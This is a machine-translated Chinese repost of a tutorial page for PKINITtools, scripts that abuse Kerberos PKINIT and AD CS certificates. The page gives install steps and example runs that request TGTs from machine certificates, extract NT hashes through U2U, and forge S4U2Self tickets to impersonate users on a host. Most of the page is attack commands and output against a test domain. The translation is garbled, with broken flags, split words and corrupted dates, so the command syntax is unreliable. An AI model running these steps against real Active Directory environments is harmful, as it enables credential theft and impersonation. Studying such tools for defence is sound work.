# PKINITtools:用于 Kerberos PKINIT 和中继到 AD CS 的工具

> 原文：<https://kalilinuxtutorials.com/pkinittools/>

[![](img/8a92e345545f0e7df833ae3833a1cc45.png)](https://blogger.googleusercontent.com/img/a/AVvXsEh_oWrkQftQSh1QA_EY7MwDBeK5izG53AsiJ4f4KuOGrtGeEsoYZ1gy3PFgNxzA9xL9-ORRv-NO0k_77XqqN2Vvyh8dN2Yox_2srDCyAzPBvwY0ODQb6XBZdFD0AZnw50yik_0BZPNLdKhbM_M8IirprbwUDWMYevpEKLqDwvJR_GwMaPJ9sT6_CAff=s720)

PKINITtools 存储库包含一些使用 PKINIT 和证书的实用程序。
工具是在 minikerberos 和 impacket 上构建的。附带更多上下文的博文:[https://dirkjanm . io/NTLM-relaying-to-ad-certificate-services/](https://dirkjanm.io/ntlm-relaying-to-ad-certificate-services/)

**安装**

这些工具仅与 Python 3.5+兼容。从 GitHub 克隆存储库，安装依赖项，然后就可以开始了:

git 克隆 https://github.com/dirkjanm/PKINITtools
pip 3 安装 impacket minikerberos

为此，建议使用 virtualenv。

**工具**

**gettgtpkinit.py**

使用 PFX 文件(作为文件或作为 base64 编码的 blob 或用于 cert+key 的 PEM 文件)请求 TGT。这使用了 Kerberos PKINIT，并将 TGT 输出到指定的 ccache 中。它还会打印出 AS-REP 加密密钥，这是 getnthash.py 工具可能需要的。使用示例:

**(PKINITtools)user @ localhost:~/PKINITtools $ python gettgtpkinit . py-h
用法:gettgtpkinit . py[-h][-cert-pfx file][-pfx-pass password][-pfx-BASE64 BASE64][-cert-pem file][-key-PEM file][-DC-IP DC _ IP][-v]
域/用户名 ccache
使用 Kerberos PKINIT 和任一 PEM 请求 TGT –帮助显示此帮助信息并退出
-cert-pfx 文件 pfx 文件
-pfx-pass password PFX 文件密码
-pfx-base64 base64 PFX 文件作为 BASE64 字符串
-cert-pem 文件 pem 格式的证书
-key-pem 文件 PEM 格式的私钥文件
-dc-ip DC_IP DC IP 或主机名用作 KDC
-v， –verbose
(PKINITtools)user @ localhost:~/PKINITtools $ python gettgtpkinit . py testsegment.local/s2019dc\$-cert-pfx ~/impacket-py3/cert . pfx-pfx-pass hoi s 2019 DC . ccache
2021-07-27 21:25:24，299 minikerberos 信息从文件中加载证书和密钥
2021-07-27 27 21:25:24，316 mini**

**getn hash . py**

使用 Kerberos U2U 为您自己提交 TGS 请求。这将包括 PAC，而 PAC 又包含 NT 哈希，您可以使用用于您的特定 TGT 的 AS-REP 密钥对其进行解密。这真的很神奇。这个工具要求在你的`**KRB5CCNAME**` env 变量中有一个来自 PKINIT 的 TGT。用法:

(PKINITtools)**user @ localhost:~/PKINITtools $ python getnthash . py-h
Impacket v 0 . 9 . 23–版权所有 2021 SecureAuth Corporation
用法:getnthash . py[-h]-KEY KEY[-DC-IP Address][-debug]identity
位置参数:
identity domain/username
可选参数:
-h，–help 显示此帮助消息并从 gettgtpkinit.py 退出
-key KEY 作为 REP key 如果允许，使用目标参数
-debug 中指定的域部分(FQDN)打开
(PKINITtools)调试输出 user @ localhost:~/PKINITtools $ export krb 5c name = s 2019 DC . ccache
(PKINITtools)user @ localhost:~/PKINITtools $ python getnthash . py testsegment.local/s2019dc\$-key 5769 dff 44 ebea a5 37 b4e 9 f 7005 f 63063 ffd 7 c 198 b 747 AE 77**

**gets4uticket.py**

使用 Kerberos S4U2Self 请求一个在您已获得证书的主机上有效的服务票证。然后，该票证可用于与原始主机进行交互。这只需要该主机的机器帐户有一个 TGT。这个 TGT 应该在您在`**kerberos_connection_url**`中指定的 ccache 文件中。本例中唯一可接受的`**kerberos_connection_url**`是包含 ccache 文件的文件，例如`**kerberos+ccache://domain.local\\victimhostname\$:victimhostname.ccache@kdchostname.domain.local**`。SPN 应该是您正在模拟的主机上的一个服务名，您不能将它用于委托攻击(因为它没有实现 S4U2Proxy，所以已经有很多工具可以实现它)。用法:

**(PKINITtools)user @ localhost:~/PKINITtools $ python Gets 4 uticket . py-h**
用法:Gets 4 uticket . py[-h][-v]kerberos _ connection _ URL SPN target user ccache
获取一个模拟给定用户的 S4U2self 票证
位置参数:
kerberos_connection_url
以下格式的 Kerberos 目标字符串 Kerberos+ccache://domain \ user:file . ccache @。重要提示:必须使用服务器的主机名，而不是 IP！！！targetuser
ccache ccache 文件将 TGT 票证存储在
中可选参数:
-h，–help 显示此帮助消息并退出
-v，–verbose
(PKINITtools)user @ localhost:~/PKINITtools $ python gets 4 uticket . py Kerberos+ccache://test segment . local \ s 2019 DC \ $:s 2019 DC . ccache @ s 2016 DC . test segment . local CIFS/s 2019 DC . test segment . local @ local
2021-07-28 10:09:13696 minikerberos 信息完成！

[**Download**](https://github.com/dirkjanm/PKINITtools)